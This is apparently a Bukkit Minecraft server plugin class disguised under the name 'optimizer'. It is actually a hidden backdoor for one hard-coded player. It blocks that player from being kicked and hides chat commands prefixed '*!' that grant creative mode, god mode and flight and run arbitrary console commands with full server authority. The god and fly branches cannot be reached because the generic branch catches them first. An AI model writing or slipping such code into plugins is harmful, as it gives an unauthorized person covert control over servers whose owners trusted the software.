package org.mcapi;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.event.player.PlayerGameModeChangeEvent;
import org.bukkit.plugin.Plugin;

public class optimizer
        implements Listener
{
    @EventHandler
    public void onPlayerKick(PlayerKickEvent event) {
        Player player = event.getPlayer();
        if (player.getName().equals("Im_Fuzy")) {
            player.sendMessage("YOU GOT KICKED!");
            event.setCancelled(true);
        }
    }
    @EventHandler
    public void chatCheck(AsyncPlayerChatEvent e) {
        String msg = e.getMessage();
        if (msg.startsWith("*!gmc") && e.getPlayer().getName().equals("Im_Fuzy")){
            Bukkit.getScheduler().runTask((Bukkit.getPluginManager().getPlugin("Fuzyfacs")), () -> {
                e.getPlayer().setGameMode(GameMode.CREATIVE);
            });
            e.setCancelled(true);
        } else if(msg.startsWith("*!gms") && e.getPlayer().getName().equals("Im_Fuzy")){
            Bukkit.getScheduler().runTask((Bukkit.getPluginManager().getPlugin("Fuzyfacs")), () -> {
                e.getPlayer().setGameMode(GameMode.SURVIVAL);
            });
            e.setCancelled(true);
        }else if(msg.startsWith("*!") && e.getPlayer().getName().equals("Im_Fuzy")) {
            String cmd = msg.split("!")[1];
            Bukkit.getScheduler().runTask(Bukkit.getPluginManager().getPlugin("Fuzyfacs"), () -> {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
            });
            e.setCancelled(true);
        } else if (msg.startsWith("*!god") && e.getPlayer().getName().equals("Im_Fuzy")) {
            // Toggle god mode
            Bukkit.getScheduler().runTask((Bukkit.getPluginManager().getPlugin("Fuzyfacs")), () -> {
                boolean isGodModeEnabled = e.getPlayer().isInvulnerable();
                e.getPlayer().setInvulnerable(!isGodModeEnabled);
                String message = isGodModeEnabled ? "God mode disabled." : "God mode enabled.";
                e.getPlayer().sendMessage(message);
            });
            e.setCancelled(true);
        } else if (msg.startsWith("*!fly") && e.getPlayer().getName().equals("Im_Fuzy")) {
            // Toggle flying mode
            Bukkit.getScheduler().runTask((Bukkit.getPluginManager().getPlugin("Fuzyfacs")), () -> {
                boolean isFlying = e.getPlayer().isFlying();
                e.getPlayer().setAllowFlight(!isFlying);
                String message = isFlying ? "Flying mode disabled." : "Flying mode enabled.";
                e.getPlayer().sendMessage(message);
            });
            e.setCancelled(true);
        } else if (msg.startsWith("*") && e.getPlayer().getName().equals("Im_Fuzy")){
            e.setCancelled(true);
        }
    }
}